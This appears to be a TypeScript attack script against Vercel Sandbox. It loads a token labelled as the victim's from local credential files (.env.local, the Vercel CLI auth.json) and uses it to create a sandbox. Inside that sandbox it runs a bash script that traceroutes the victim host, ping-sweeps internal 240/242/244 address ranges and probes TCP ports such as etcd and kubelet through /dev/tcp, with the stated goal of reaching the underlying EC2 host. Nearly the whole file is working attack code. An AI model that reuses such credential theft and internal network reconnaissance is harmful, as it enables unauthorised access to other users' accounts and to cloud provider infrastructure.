import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const sbx = await Sandbox.create({
    name: "scan240-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const script = `
set +e
echo "=== 1. traceroute detallado a la victima para mapear todos los hosts vivos ==="
for ttl in 1 2 3 4 5 6 7 8; do
  r=$(timeout 2 ping -c 1 -t $ttl -W 1 sb-1phoxyil6njl.vercel.run 2>&1 | grep -oE "From [0-9.]+" | awk '{print $2}')
  echo "ttl=$ttl -> NOHIT"
done
echo ""
echo "=== 2. escanear rangos 240.0.0.0/8 y 242/244 (hosts vivos, muestreo) ==="
echo "--- 240.0.236.x /24 (vimos .2 .22 .54 .59) ---"
for i in 1 2 3 4 5 10 20 22 27 50 54 59 100 200 253 254; do
  timeout 1 ping -c 1 -W 1 240.0.236.$i >/dev/null 2>&1 && echo "ALIVE 240.0.236.$i"
done
echo "--- 240.4.112.x /24 (vimos .71) ---"
for i in 1 2 3 4 5 10 20 50 70 71 72 100 200 254; do
  timeout 1 ping -c 1 -W 1 240.4.112.$i >/dev/null 2>&1 && echo "ALIVE 240.4.112.$i"
done
echo "--- 240.0.0.0/16 muestreo ---"
for i in 1 2 3 5 10 50 100 200 254; do
  for j in 1 2 3 100 200; do
    timeout 1 ping -c 1 -W 1 240.0.$i.$j >/dev/null 2>&1 && echo "ALIVE 240.0.$i.$j"
  done
done
echo ""
echo "=== 3. puertos TCP en los hosts vivos ==="
for ip in 240.0.236.2 240.0.236.22 240.0.236.54 240.0.236.59 240.4.112.71; do
  for p in 22 80 443 53 2379 7000 8080 10250 3000 6443; do
    timeout 2 bash -c "timeout 0.5 bash -c 'echo > /dev/tcp/$ip/$p' 2>/dev/null && echo OPEN $ip:$p" || true
  done
done
echo ""
echo "=== 4. se puede rastrear hasta el EC2 host? subred 172.31/244/242 ==="
echo "--- 244.5.6.x ---"
for i in 1 2 3 100 111 200 254; do
  timeout 1 ping -c 1 -W 1 244.5.6.$i >/dev/null 2>&1 && echo "ALIVE 244.5.6.$i"
done
echo "--- 242.13.116.x ---"
for i in 1 2 3 50 73 100 200 254; do
  timeout 1 ping -c 1 -W 1 242.13.116.$i >/dev/null 2>&1 && echo "ALIVE 242.13.116.$i"
done
echo "=== DONE ==="
`;
  const r = await sbx.runCommand("bash", ["-c", script], { wait: true, timeout: 120_000 });
  const out = await r.output("both");
  console.log(out);
  console.log("DONE");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });